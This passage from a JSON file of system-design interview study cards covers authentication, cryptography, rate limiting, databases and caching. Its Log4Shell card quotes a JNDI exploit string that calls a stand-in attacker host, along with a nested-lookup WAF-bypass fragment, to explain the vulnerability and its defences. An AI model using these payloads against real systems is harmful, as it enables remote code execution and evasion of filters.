      "section": "Week 1 Review & Active Recall",
      "whatItIs": "A comprehensive self-assessment checklist covering the 5 foundational competencies of Week 1: estimation math, transport protocols, virtualization boundaries, load balancing topologies, and ingress gateways.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you derive QPS and storage requirements on a whiteboard without hesitation?\n[ ] Can you explain why HTTP/2 single connection causes transport HOL on mobile networks?\n[ ] Can you contrast Type-1 hypervisors with Linux cgroups and namespaces?\n[ ] Can you articulate why L4 load balancing is required in front of L7 Envoy gateways?\n[ ] Can you write the Little's Law formula ($L = \\lambda \\times W$) and explain queue collapse?",
      "tradeoffs": [
        "Textbook reciting vs. Senior intuition (Always link concepts to operational failure modes)",
        "Speed vs. Clarity (State assumptions explicitly before calculating numbers)"
      ],
      "keyTakeaway": "Active recall beats passive reading. If you cannot explain a concept in 60 seconds without notes, revisit the section."
    }
  ],
  "8": [
    {
      "id": "3.1",
      "tabTitle": "3.1 JWT vs Sessions",
      "title": "3.1 Token-Based Authentication: JWT vs. Session-Based Authentication",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Stateful Session-Based Authentication (opaque session ID in cookie, server-side Redis lookup on every request) vs. Stateless Token-Based Authentication (JSON Web Token signed with cryptographic keys, verified offline by microservices without database queries).",
      "architecture": "STATEFUL VS. STATELESS:\n• Stateful Session: Client ──Cookie: session_id──► Server ──Lookup──► [ Redis Session Store ] (1 DB/cache hit per request! Instant revocation via DELETE)\n• Stateless JWT: Client ──Bearer JWT──► Microservice ──Verify Signature with Public Key──► OK (0 DB hits! Verification in microseconds; revocation requires blacklisting/versioning)",
      "tradeoffs": [
        "Scalability vs Revocation (Sessions allow instant user logout but burden Redis; JWTs scale infinitely across microservices but cannot be easily revoked before expiration)",
        "Where to Store Tokens (Never store JWT in localStorage due to XSS vulnerability; keep access tokens in JS memory and refresh tokens in HttpOnly cookies)"
      ],
      "keyTakeaway": "Sessions give you instant revocation at the cost of centralized storage lookups. JWTs give you zero-lookup stateless scalability across microservices at the cost of difficult revocation. In production, use the hybrid model: 15-minute access tokens validated offline + revokable refresh tokens in HttpOnly cookies."
    },
    {
      "id": "3.2",
      "tabTitle": "3.2 Password Hashing",
      "title": "3.2 How to Store Passwords Safely in a Database",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Cryptographic defense against credential leaks, rainbow tables, and GPU brute-force cracking using slow memory-hard key derivation functions.",
      "architecture": "STORAGE & VERIFICATION FLOW:\nRegister: password + unique random salt + secret pepper ──► Argon2id / bcrypt ──► $argon2id$v=19$m=65536,t=3,p=4$salt$hash\nVerify: crypto.timingSafeEqual(storedHash, computedHash) (Strict constant-time compare prevents timing side-channels)\nThreat Model: 16-byte salt defeats precomputation; memory-hardness defeats GPUs; pepper in HSM defeats DB dumps.",
      "tradeoffs": [
        "SHA-256 (Fatal flaw: GPUs compute 30+ billion/sec; salting only defeats rainbow tables, not brute force) vs. Memory-hard Argon2id (NIST/OWASP #1)",
        "Tuning Work Factor: 100–250ms per verification. Capacity math: 100 logins/sec @ 250ms consumes 25 CPU cores purely on hashing!",
        "Migrating Legacy Hashes: Lazy re-hashing on login (upgrade transparently on successful auth) vs. dual-hash wrapping"
      ],
      "keyTakeaway": "Unique salt per user + slow memory-hard hash (Argon2id) + constant-time comparison + pepper stored outside the DB. Salting defeats precomputed rainbow tables; only slow memory-hard hashing defeats GPU brute-force attacks."
    },
    {
      "id": "3.3",
      "tabTitle": "3.3 SSO & OAuth/OIDC",
      "title": "3.3 Single Sign-On (SSO): OAuth 2.0 vs. OpenID Connect (OIDC) vs. SAML",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Decoupling identity and delegation: SAML 2.0 for enterprise XML identity federation, OAuth 2.0 for delegated authorization scopes, and OpenID Connect (OIDC) for modern REST/JSON identity authentication.",
      "architecture": "OIDC AUTHORIZATION CODE WITH PKCE:\nBrowser/App ──1. Auth Request + code_challenge──► Authorization Server (IdP)\nBrowser/App ◄──2. Redirect with short-lived auth code (30s)────────┘\nApp Backend ──3. POST /token + auth code + code_verifier─────────► IdP\nApp Backend ◄──4. Returns ID Token (JWT) + Access Token + Refresh Token ┘\nIdentity: ID Token verifies AuthN. Access Token authorizes API calls.",
      "tradeoffs": [
        "OAuth 2.0 is AuthZ, NOT AuthN (Never use OAuth access tokens alone to identify users; use OIDC ID Tokens signed by IdP)",
        "PKCE (Proof Key for Code Exchange) is mandatory for SPAs & mobile apps to prevent authorization code interception",
        "SAML 2.0 (Enterprise Okta/Active Directory, XML signatures) vs OIDC (Modern mobile/web apps, lightweight JSON/JWT)"
      ],
      "keyTakeaway": "SAML 2.0 is for enterprise legacy identity federation; OAuth 2.0 is an authorization framework for API permissions; and OpenID Connect (OIDC) is the modern authentication standard built on OAuth 2.0. Always use Authorization Code Flow with PKCE for single sign-on."
    },
    {
      "id": "3.4",
      "tabTitle": "3.4 RBAC vs ABAC",
      "title": "3.4 Role-Based Access Control (RBAC) vs. Attribute-Based Access Control (ABAC)",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Authorization architecture: static role bindings (RBAC) vs dynamic evaluation over Subject, Action, Resource, and Environment attributes (ABAC) and graph-based relationship tuples (ReBAC / Google Zanzibar).",
      "architecture": "DECOUPLED AUTHORIZATION (OPA PDP):\nRequest ──► API Gateway / Service Middleware (PEP) ──Ask Decision──► Open Policy Agent (PDP)\nEvaluation: Input JSON (Subject clearance, Resource tenant, Action, Environment IP/time) matched against versioned Rego policy rules.\nResult: Sub-millisecond Allow/Deny returned to PEP.",
      "tradeoffs": [
        "Role Explosion in RBAC (Combinatorial roles like Finance_EU_Read_Weekend) vs Dynamic ABAC attributes",
        "Decoupled Policy (Use Open Policy Agent as a local sidecar so security rules update via GitOps without redeploying code)",
        "ReBAC & Zanzibar (Use relationship tuples object#relation@user for Google Docs/GitHub collaborative ownership)"
      ],
      "keyTakeaway": "Use RBAC for coarse-grained functional access; use ABAC or ReBAC for fine-grained resource and contextual authorization. Decouple authorization logic completely from application code using dedicated policy engines like Open Policy Agent (OPA) or Google Zanzibar-inspired ReBAC."
    },
    {
      "id": "3.5",
      "tabTitle": "3.5 Encryption: AES/RSA/ECC",
      "title": "3.5 Symmetric vs. Asymmetric Encryption: AES vs. RSA vs. ECC",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Foundational cryptography for data at rest and in transit: high-throughput symmetric ciphers (AES-256-GCM) paired with asymmetric key pairs (ECC/RSA) in hybrid cryptosystems and cloud KMS envelope encryption.",
      "architecture": "AWS KMS ENVELOPE ENCRYPTION:\n1. App calls KMS GenerateDataKey(kek_id) → KMS returns Plaintext DEK + Encrypted DEK\n2. App encrypts bulk data locally with AES-256-GCM using Plaintext DEK (GB/s hardware speed)\n3. App wipes Plaintext DEK from RAM immediately\n4. App stores Encrypted DEK alongside Ciphertext on disk/S3 (Zero KMS throughput bottleneck!)",
      "tradeoffs": [
        "Symmetric (AES-256-GCM: ultra-fast, 5+ GB/s AES-NI) vs Asymmetric (ECC/RSA: 1000x slower, solves key distribution)",
        "ECC vs RSA (256-bit ECC matches 3072-bit RSA with 10x faster signatures and tiny network packet size)",
        "The ECB Penguin Trap (Never use AES in ECB mode; always use AEAD modes like AES-GCM or ChaCha20-Poly1305 to guarantee confidentiality AND tamper-proof integrity)"
      ],
      "keyTakeaway": "Symmetric encryption (AES-256-GCM) secures bulk data at rest and high-throughput network channels with hardware acceleration; asymmetric encryption (ECC / RSA) solves key exchange and digital identity. In system design, always propose a Hybrid Cryptosystem (TLS 1.3) for data in transit and KMS Envelope Encryption (KEK + DEK) for data at rest, strictly using AEAD modes."
    },
    {
      "id": "3.6",
      "tabTitle": "3.6 Rate Limiting",
      "title": "3.6 Rate Limiting Algorithms & Architecture",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Controlling the rate of traffic sent or received to protect backend capacity, manage traffic spikes, enforce fair multi-tenant quotas, and prevent DoS attacks.",
      "architecture": "ATOMIC REDIS TOKEN BUCKET (Lua):\nlocal key = KEYS[1]; local tokens = redis.call('get', key .. ':tokens') or capacity\nlocal elapsed = math.max(0, now - last_refill); tokens = min(capacity, tokens + elapsed * refill_rate)\nif tokens >= requested then redis.call('set', key .. ':tokens', tokens - requested); return 1 else return 0 end\nHTTP 429: Returns X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset, and Retry-After headers.",
      "tradeoffs": [
        "5 Algorithms: Token Bucket (burst-tolerant default) vs Leaky Bucket (smooth output) vs Fixed Window (boundary bursts) vs Sliding Log (exact, O(N) RAM) vs Sliding Counter (production hybrid)",
        "Distributed Race Conditions: Atomic Redis Lua scripts + cluster hash tags {user_id}:tokens eliminate concurrency leaks",
        "Fail-Open vs Fail-Closed: Always fail-open with local in-memory fallback limits if Redis cluster crashes"
      ],
      "keyTakeaway": "Rate limiting protects system availability, controls cloud costs, and guarantees multi-tenant fairness. Know the 5 algorithms cold: Token Bucket (burst-tolerant default), Leaky Bucket (smooth output), Fixed Window (simple but flawed boundary), Sliding Log (exact but memory heavy), and Sliding Window Counter (production hybrid)."
    },
    {
      "id": "3.7",
      "tabTitle": "3.7 Log4Shell Zero-Day",
      "title": "3.5 Log4Shell: Anatomy of a Zero-Day",
      "section": "Part 3 · Security, Auth & API Access",
      "whatItIs": "Analysis of CVE-2021-44228 (CVSS 10.0) where JNDI message lookup interpolation in logging permitted remote code execution via LDAP/RMI.",
      "architecture": "THE 5-STAGE EXPLOITATION CHAIN:\nAttacker sends payload: ${jndi:ldap://attacker.com:1389/Exploit} in User-Agent header\n  │\n  ▼ 1. Target app logs string via Log4j 2.x (Message Pattern Converter)\n  ▼ 2. Log4j JNDI Manager initiates outbound TCP connection to attacker LDAP server (Port 1389)\n  ▼ 3. Remote LDAP server returns Java Reference object pointing to Exploit.class\n  ▼ 4. Host JVM fetches and deserializes remote bytecode\n  ▼ 5. JVM executes bytecode constructor → Full Remote Code Execution (RCE) / Reverse Shell!",
      "tradeoffs": [
        "Active Evaluation in a Passive Sink (Logging was assumed to be safe text; Log4j turned it into an unconstrained expression evaluator)",
        "Default-Deny Egress: Blocking arbitrary outbound non-443 connections breaks the exploit chain completely even on unpatched servers",
        "WAF Regex Fallacy: Perimeter regex rules are easily bypassed via nested lookups ${${lower:j}ndi:; defense must be architectural"
      ],
      "keyTakeaway": "Log4Shell proved that logging is an execution sink, not just a passive text dump. In system design interviews, treat security as multi-layered defense-in-depth: sanitize input, isolate runtime processes with non-root containers, enforce strict Default-Deny Egress firewalls, and maintain automated SBOM inventory for rapid zero-day remediation."
    }
  ],
  "9": [
    {
      "id": "4.1",
      "tabTitle": "4.1 SQL vs NoSQL",
      "title": "4.1 Relational (SQL) vs. Non-Relational (NoSQL) Databases",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Architectural selection between relational databases (PostgreSQL, MySQL) and non-relational families (Document, Key-Value, Wide-Column, Graph) based on schema discipline, ACID guarantees, and horizontal partition scale.",
      "architecture": "DATA MODELING TRADEOFF:\n• SQL Normalized: USERS ──1:N──► ORDERS ──1:N──► ORDER_ITEMS (Atomic joins, zero redundancy, vertical scaling)\n• NoSQL Denormalized: User document embeds orders or hash partitioned by partition key (Single I/O read, horizontal scale across 1,000 nodes)\n• Polyglot Persistence: PostgreSQL (financial ledger) + DynamoDB (user events) + Redis (sessions) + Elasticsearch (search)",
      "tradeoffs": [
        "ACID vs BASE (Strict multi-table ACID transactions vs distributed eventual consistency)",
        "Schema-on-Write (SQL DDL migrations) vs Schema-on-Read (NoSQL dynamic JSON)",
        "The NoSQL Query Pattern Trap (Partition keys must match exact query patterns; ad-hoc queries cause catastrophic full table scans)"
      ],
      "keyTakeaway": "Never pick a database based on hype. Choose SQL when ACID transactions, relational integrity, and ad-hoc joins are non-negotiable. Choose NoSQL when horizontal write throughput, high partition availability, and predictable key-value access patterns dominate. In modern enterprise systems, propose Polyglot Persistence synchronized via Change Data Capture (CDC)."
    },
    {
      "id": "4.2",
      "tabTitle": "4.2 Isolation & MVCC",
      "title": "4.2 Database Isolation Levels and MVCC",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Database isolation levels govern how concurrent transactions observe each other's writes, balancing transactional correctness against engine throughput.",
      "architecture": "MVCC VERSION CHAIN (Undo Log):\nRow: balance=100 (txn_id=200 committed)\nTxn A starts (Read View 201) → writes balance=200 (uncommitted)\nUndo log: [balance=200, txn_id=201] ──roll_pointer──► [balance=100, txn_id=200]\nTxn B starts (Read View 202) → reads balance=100 (skips uncommitted 201!)\nReaders NEVER block writers, writers NEVER block readers!",
      "tradeoffs": [
        "Isolation Levels & Anomalies: Read Uncommitted (dirty reads) → Read Committed (non-repeatable reads) → Repeatable Read (phantoms) → Serializable",
        "Write Skew: The anomaly MVCC snapshot isolation cannot prevent (e.g. two on-call doctors both checking 'at least 1 doctor on duty' and both going off-shift; fix via `SELECT FOR UPDATE` or Serializable SSI)",
        "Operational Cost of MVCC: Long-running read transactions pin undo logs, causing table bloat and transaction ID wraparound in PostgreSQL"
      ],
      "keyTakeaway": "Isolation level is a dial between anomalies and throughput, and MVCC is the trick that lets readers and writers not block each other. Know your engine's default (MySQL: Repeatable Read, Postgres: Read Committed)."
    },
    {
      "id": "4.3",
      "tabTitle": "4.3 Locking Models",
      "title": "4.3 Optimistic vs. Pessimistic Locking",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Two fundamental concurrency control strategies for preventing double-booking and race conditions when multiple clients mutate shared state.",
      "architecture": "OPTIMISTIC CONDITIONAL UPDATE:\nSELECT available_rooms, version FROM hotel_rooms WHERE id = 42; -- version=7\nUPDATE hotel_rooms\n   SET available_rooms = 0, version = 8\n WHERE id = 42 AND version = 7; -- Optimistic check\n-- rows_affected = 1 → SUCCESS | rows_affected = 0 → RETRY",
      "tradeoffs": [
        "Low Contention (Optimistic wins: zero lock acquisition overhead, fast) vs. High Contention (Pessimistic wins: eliminates $O(N^2)$ retry storms and livelocks)",
        "Pessimistic Locking (`SELECT FOR UPDATE`: serializes contention, fair FIFO, but risks deadlocks and holds DB connection open across network hops)",
        "Eliminating the Race Entirely: Atomic in-engine decrement (`UPDATE stock SET qty = qty - 1 WHERE qty > 0`) or single-owner queue partitioning"
      ],
      "keyTakeaway": "Optimistic locking is cheap when conflicts are rare and pathological when they are not. Say 'contention determines the choice', then show the atomic conditional update escape hatch."
    },
    {
      "id": "4.4",
      "tabTitle": "4.4 CAP & PACELC",
      "title": "4.4 CAP and PACELC Theorems",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The theoretical boundaries of distributed data stores under network partitions and normal operational latency.",
      "architecture": "CAP & PACELC THEOREM FORMULATION:\nif (Partition P):\n    choose Availability (AP: accept writes, risk inconsistency)\n    or Consistency (CP: refuse writes, return error)\nelse (Normal State):\n    choose Latency (EL: fast local read, replication lag)\n    or Consistency (EC: wait for quorum ACK, high write latency)",
      "tradeoffs": [
        "'Pick 2 of 3' Myth (P is not optional on physical networks; fiber gets cut. The real choice is C vs. A ONLY while partitioned)",
        "ACID Consistency (C = invariants satisfied) vs. CAP Consistency (C = linearizability: every read returns latest write)",
        "Per-Data Flow Architecture: Real systems are mixed — CP for payment ledger and balance decrements, AP for product catalog and view counts"
      ],
      "keyTakeaway": "CAP only bites during a partition; PACELC describes the trade you make every millisecond. Answer per data flow: 'CP for the ledger, AP for the catalog.'"
    }
  ],
  "10": [
    {
      "id": "4.5",
      "tabTitle": "4.4 Replication Trade-off",
      "title": "4.4 The Latency / Consistency Trade-off in Replication",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The fundamental trade-off between write acknowledgement latency and data durability across replicated database nodes.",
      "architecture": "THREE REPLICATION MODES:\n1. Synchronous: Client → Primary → Replica 1 & 2 persist → Primary ACKs (Zero data loss RPO=0, write latency = slowest replica)\n2. Asynchronous: Client → Primary persists → Primary ACKs immediately → Replicates in background (Fastest, data loss window on leader crash)\n3. Semi-Synchronous (The Pragmatic Default): ACK after $k$ of $n$ replicas persist (e.g. MySQL semi-sync, Kafka acks=all with min.insync.replicas=2)",
      "tradeoffs": [
        "RPO (Recovery Point Objective: max acceptable data loss) vs. RTO (Recovery Time Objective: failover duration)",
        "Availability penalty of sync replication (Shared fate: any slow or dead replica stalls all writes; quorum mitigates slowest node)",
        "Leader-based (Single write bottleneck, simple consistency) vs. Leaderless (Cassandra: writes anywhere, requires read repair and anti-entropy)"
      ],
      "keyTakeaway": "You cannot have a local-latency write and a globally consistent read of it. Pick per data flow using RPO/RTO language, and default to semi-synchronous within a region plus asynchronous across regions — that is what most production systems actually do."
    },
    {
      "id": "4.5-read-replica",
      "tabTitle": "Read-Replica Pattern",
      "title": "The Read-Replica Pattern & Replication Lag",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Distributing read traffic across read-only replica nodes while routing writes to a single primary database, and mitigating replication lag anomalies.",
      "architecture": "READ-AFTER-WRITE ROUTING:\nOrder Service ──write──► Primary DB ──async replication (lag!)──► Replicas (R1, R2)\nClient reads: If read-sensitive / 'just wrote' → Route to Primary for N seconds\nIf read-tolerant (browse catalog) → Route to Replicas (offload 90% DB load)",
      "tradeoffs": [
        "Replication Lag Anomaly (Alice places order, refreshes page, replica is 200ms behind, order is missing!)",
        "Solutions: 1. Sticky session to primary for 5s after write; 2. GTID / LSN position check; 3. Return created entity directly in write response",
        "What Replicas DO NOT Solve: Replicas scale reads only! Every replica applies 100% of the write stream. Adding replicas never increases write capacity"
      ],
      "keyTakeaway": "Read replicas are the cheapest way to scale reads, and replication lag is the bill. Always pair the pattern with an explicit read-after-write routing story."
    },
    {
      "id": "4.8",
      "tabTitle": "4.8 Choosing DB",
      "title": "4.8 A Visual Guide to Choosing the Right Database",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Workload-driven database taxonomy matching storage architectures to access patterns, query shapes, and consistency requirements.",
      "architecture": "THE DECISION MATRIX:\n• Relational (Postgres, MySQL): Structured, ACID, ad-hoc joins, transactional orders & ledgers (The Default)\n• Key-Value (DynamoDB, Redis): Single-key get/put at massive scale, user profiles, sessions\n• Document (MongoDB): Semi-structured JSON, catalogs, rapidly evolving schemas\n• Wide-Column (Cassandra, ScyllaDB): Massive write rates, queries by partition + clustering key\n• Columnar OLAP (ClickHouse, BigQuery, Snowflake): Analytical aggregation over billions of rows\n• In-Memory (Redis, Memcached): Sub-millisecond volatile caching, rate limits, leaderboards",
      "tradeoffs": [
        "PostgreSQL as the Pragmatic Default (Handles relational, JSONB documents, full-text search, PostGIS geospatial, and range partitioning in one engine)",
        "Polyglot Persistence Tax (Each additional database engine introduces sync CDC pipelines, replication lag, and specialized operational on-call overhead)"
      ],
      "keyTakeaway": "Right database for the right workload: derive from access patterns, consistency needs, and scale. Defaulting to Postgres and cost-justifying each addition signals senior maturity."
    }
  ],
  "11": [
    {
      "id": "4.6",
      "tabTitle": "4.6 Sharding",
      "title": "4.6 Vertical and Horizontal Partitioning (Sharding)",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Partitioning datasets across multiple database nodes to scale beyond the write throughput and storage limits of a single machine.",
      "architecture": "SHARDING ROUTING SCHEMES:\n• Range-Based (e.g. user_id 1–1M to Shard 1, 1M–2M to Shard 2): Efficient range scans, but sequential keys create write hotspots on newest shard\n• Hash-Based (hash(user_id) mod N): Even distribution, but range queries become expensive scatter-gather across all shards; resharding rehashes ~80% keys",
      "tradeoffs": [
        "The Permanent Tax of Sharding: Cross-shard joins disappear; multi-shard transactions require 2PC or Sagas; secondary indexes require global lookup tables",
        "Shard Key Selection: High cardinality, even access distribution, matches dominant query pattern, and immutable",
        "Virtual Sharding (1,024 logical shards mapped to 8 physical nodes) enables online cluster rebalancing via metadata reassignment without resharding code"
      ],
      "keyTakeaway": "Shard only when the numbers force you to, and let the shard key be driven by the dominant query pattern. Name the permanent costs up front."
    },
    {
      "id": "4.7",
      "tabTitle": "4.7 Consistent Hashing",
      "title": "4.7 Consistent Hashing & Hash Rings",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "A distributed hashing technique where adding or removing a storage node remaps only $K/N$ keys instead of reshuffling nearly the entire keyspace.",
      "architecture": "CONSISTENT HASH RING:\nKeyspace: [0 to 2^32 - 1] mapped on a continuous circular ring\nNodes & Keys hashed onto ring; key belongs to first node clockwise.\nNode Addition: Adding Node D between B and C only remaps keys in that arc from C to D!\nVirtual Nodes (vnodes): Each physical server maps to 100–256 points on the ring → eliminates hot spots and distributes failure load evenly across peers.",
      "tradeoffs": [
        "Ring without vnodes (Uneven load distribution, node failure dumps 100% of load onto single clockwise neighbor causing cascading crash)",
        "Consistent Hashing DOES NOT solve Hot Keys (A viral celebrity tweet still maps to one node; solved orthogonally via caching or salting keys)"
      ],
      "keyTakeaway": "Consistent hashing + virtual nodes = elastic membership without mass data movement. Only K/N keys move. State plainly that it does nothing for hot keys."
    },
    {
      "id": "4.9",
      "tabTitle": "4.9 Storage Engines",
      "title": "4.9 Storage Engines: B-Tree vs. LSM-Tree",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Comparing in-place update storage engines (B-Trees) with append-only log-structured merge trees (LSM-Trees) on disk I/O characteristics.",
      "architecture": "DISK ORGANIZATION:\n• B-Tree (Postgres/InnoDB): In-place page update → RANDOM I/O + WAL. Read: O(log N) page walks. Write amplification from 16KB page rewrites.\n• LSM-Tree (RocksDB/Cassandra): Append-only write to MemTable in RAM + sequential WAL → flushed to immutable SSTables (L0, L1, L2). Background Compaction merges sorted runs and purges tombstones.",
      "tradeoffs": [
        "B-Tree (Predictable low-latency reads, stable performance, excellent range scans) vs. LSM-Tree (Order-of-magnitude higher write throughput, sequential I/O)",
        "LSM Compaction Pitfalls (Compaction competes with incoming traffic for disk I/O, causing write stalls and elevated p99 latency spikes)",
        "Deletes in LSM (Deletes are written as tombstones; read queries across heavily deleted tables scan millions of tombstones until compaction finishes)"
      ],
      "keyTakeaway": "Random writes are the enemy. B-Tree for balanced, read-oriented transactional workloads; LSM for ingest-heavy write workloads where you can absorb compaction."
    }
  ],
  "12": [
    {
      "id": "4.11",
      "tabTitle": "4.11 Metrics TSDB",
      "title": "4.11 Choosing a Database for Metrics (Time Series)",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "Architecting high-frequency operational telemetry storage handling millions of append-only time-series data points per second.",
      "architecture": "TSDB ARCHITECTURAL ADVANTAGES:\n• Sequential Append-only by time: Zero in-place row mutations, high disk compression\n• Columnar Per-Series Blocks: Delta-of-delta timestamp compression + XOR float encoding (often <2 bytes per sample vs. 16+ bytes in relational tables)\n• Inverted Index on Labels: Rapid tag searching without creating relational index bloat\n• Built-in Rollups & Retention: Raw 10s for 7 days → 1min for 30 days → 1hr for 2 years",
      "tradeoffs": [
        "Why NOT MySQL/Postgres for metrics (Index maintenance under heavy writes collapses write throughput; rolling-window aggregations require expensive table scans)",
        "The High-Cardinality Trap (Adding `user_id` or `request_id` to metrics tags multiplies total series count exponentially, leading to Prometheus OOM crashes)"
      ],
      "keyTakeaway": "Metrics are write-heavy, append-only, time-ordered, and read in bursts. Purpose-built TSDBs win on compression and query semantics. Enforce strict label cardinality."
    },
    {
      "id": "4.12",
      "tabTitle": "4.12 Big Data Evolution",
      "title": "4.12 Big Data: The Papers and the Evolution",
      "section": "Part 4 · Databases & Consistency",
      "whatItIs": "The 20-year historical trajectory of large-scale distributed data processing from Google's foundational 2003–2006 whitepapers to modern streaming.",
      "architecture": "LINEAGE AT A GLANCE:\nGFS (2003: Storage) + MapReduce (2004: Compute) + Bigtable (2006: Serving)\n  │\n  ├─► OLTP Branch: BigTable (no txn) → Megastore (entity groups) → Spanner (TrueTime, external consistency)\n  │\n  └─► OLAP Branch: MapReduce (batch) → Hive (SQL) → Dremel/BigQuery (interactive columnar query)\n      └─► Streaming: Lambda Architecture (Batch + Stream paths) → Kappa (Single streaming log) → Dataflow/Flink",
      "tradeoffs": [
        "Lambda Architecture (Dual code paths for batch and streaming: high maintenance and consistency synchronization burden) vs. Kappa Architecture (Single log replay)",
        "Event Time vs. Processing Time (Mobile events arrive late and out of order; streaming pipelines require watermarks to trigger time windows accurately)"
      ],
      "keyTakeaway": "Big data history is a story of giving up guarantees for scale, then buying them back: SQL on MapReduce, transactions on BigTable, single streaming path over dual paths."
    }
  ],
  "13": [
    {
      "id": "5.1",
      "tabTitle": "5.1 Cache Strategies",
      "title": "5.1 The Five Cache Strategies",
      "section": "Part 5 · Caching",
      "whatItIs": "Patterns governing how application services orchestrate data synchronization between volatile in-memory caches and persistent databases.",
      "architecture": "READ & WRITE PATTERNS:\n• Cache-Aside (Lazy Loading): App checks cache; on miss reads DB, populates cache with TTL. (Resilient to cache death; 3 hops on miss)\n• Read-Through: App queries cache proxy; cache transparently fills itself from DB.\n• Write-Through: App writes cache; cache synchronously writes DB. (Cache never stale; higher write latency)\n• Write-Around: App writes DB directly; skips cache. (Prevents polluting cache with write-once cold data)\n• Write-Back (Write-Behind): App writes cache; cache buffers and flushes async batch to DB. (Highest throughput; data loss risk on crash!)",
      "tradeoffs": [
        "Standard Production Pairing: Cache-Aside for reads + Write-Around (delete-on-write) for writes",
        "Invalidate vs. Update (Always prefer DELETE cache_key over SET cache_key on write to avoid race condition interleavings)",
        "Eviction Policies: LRU (least recently used, general default) vs. LFU (least frequently used, protects against one-off cache-flushing scans)"
      ],
      "keyTakeaway": "Cache aside for reads, delete-on-write for writes, TTL with jitter as a backstop. Deviate only when forced by durability (write-back) or strict freshness (write-through)."
    },
    {
      "id": "5.2",
      "tabTitle": "5.2 Cache Failure Modes",
      "title": "5.2 Cache Failure Modes: Penetration, Stampede, Avalanche",
      "section": "Part 5 · Caching",
      "whatItIs": "The three classic cascading collapse scenarios of caching systems and their production mitigation patterns.",
      "architecture": "THE THREE FAILURE SCENARIOS:\n1. Penetration: Non-existent keys query cache → miss → hit DB → DB miss. Attacker floods invalid IDs.\n   Fix: Bloom filter pre-check + negative caching with short TTL (30s).\n2. Stampede (Thundering Herd): 1 popular hot key expires; 10,000 concurrent readers all miss simultaneously and hammer DB.\n   Fix: Mutex lock (single-flight: only 1 caller fills DB; others wait or receive stale data).\n3. Avalanche: Millions of keys share identical TTL and expire at same second, or cache cluster crashes.\n   Fix: TTL Jitter (base ± random 20%) + cache warming + circuit breakers.",
      "tradeoffs": [
        "Negative Caching vs. Bloom Filters (Negative cache sentinels fill memory under randomized attacks; Bloom filters answer 'definitely absent' in zero DB hits)",
        "Logical Expiry (Store 'refresh_after' timestamp inside value; background worker refreshes while existing users receive stale value)"
      ],
      "keyTakeaway": "Name all three failure modes: penetration (negative cache + bloom filter), stampede (single-flight + serve stale), avalanche (TTL jitter + warmup + breakers)."
    },
    {
      "id": "5.3",
      "tabTitle": "5.3 Redis vs Memcached",
      "title": "5.3 Redis vs. Memcached",
      "section": "Part 5 · Caching",
      "whatItIs": "Architectural comparison between the two dominant in-memory data store technologies.",
      "architecture": "COMPARISON MATRIX:\n• Redis: Rich data structures (Strings, Hashes, Sets, Sorted Sets, Bitmaps, Streams), single-threaded execution loop (lock-free), persistence (RDB/AOF), built-in Sentinel/Cluster\n• Memcached: Pure key-value strings/blobs, multi-threaded architecture (scales linearly on massive multi-core instances), purely volatile (no persistence), slab memory allocator",
      "tradeoffs": [
        "Choose Redis when you need data structures (leaderboards via Sorted Sets, rate limiters via Lua, sets for online presence)",
        "Choose Memcached for pure, huge, volatile key-value caching where maximum memory efficiency and multi-core CPU throughput dominate",
        "Redis Single-Threading: Not a bottleneck because memory commands run in nanoseconds. Threaded I/O added in Redis 6 for network syscalls"
      ],
      "keyTakeaway": "Memcached is a cache; Redis is a data structure server that is often used as a cache. If your answer involves counters, sets, or queues, you have already chosen Redis."
    }
  ],
  "14": [
    {
      "id": "rev-2",
      "tabTitle": "Drills & Recall",
      "title": "Revision Day 2 · Database Internals, Sharding & Caching",
      "section": "Week 2 Review & Active Recall",
      "whatItIs": "Consolidation drills on Week 2 database and caching concepts: ACID isolation levels, sharding strategies, B-Trees vs LSM-Trees, and cache failure modes.",
      "architecture": "WEEK 2 RAPID AUDIT:\n✓ ANSI SQL Isolation Levels vs. Real-world anomalies (Write skew)\n✓ MVCC Read View and undo log rollback mechanics\n✓ Optimistic conditional update SQL vs. Pessimistic SELECT FOR UPDATE\n✓ CAP & PACELC theorem per-flow decision making\n✓ Sharding key criteria and virtual sharding (vnodes)\n✓ Cache failure taxonomy: Penetration, Stampede, Avalanche",
      "tradeoffs": [
        "Whiteboard Drill: Sizing a distributed Redis cluster for 500K ops/sec with consistent hashing",
        "Interview Drill: Explaining why write skew happens under Repeatable Read and how to resolve it"
      ],
      "keyTakeaway": "Senior interviewers test database edge cases: isolation anomalies, replication lag, and cache collapse. State failure modes before proposing solutions."
    },
    {
      "id": "rev-2-checklist",
      "tabTitle": "Week 2 Checklist",
      "title": "Week 2 Core Mastery Checklist",
      "section": "Week 2 Review & Active Recall",
      "whatItIs": "Self-assessment checklist to verify senior-level fluency on database architecture and storage engines.",
      "architecture": "CHECKLIST OF CORE CONCEPTS:\n[ ] Can you explain why read-replicas provide zero write-scaling capability?\n[ ] Can you write the exact conditional SQL statement for optimistic locking?\n[ ] Can you diagram how an LSM-Tree handles deletes via tombstones and compaction?\n[ ] Can you explain how single-flight mutex locking prevents a cache stampede?\n[ ] Can you explain why consistent hashing alone does NOT solve hot keys?",
      "tradeoffs": [
        "Relying on database defaults vs. Engine nuances (Postgres Read Committed vs. MySQL Repeatable Read)",
        "Premature sharding vs. Vertical optimization (Shrinking row widths to fit buffer pools)"
      ],
      "keyTakeaway": "Master the difference between detecting conflicts and eliminating them: atomic in-engine operations beat retry loops every time."
    }
  ],
  "15": [
    {
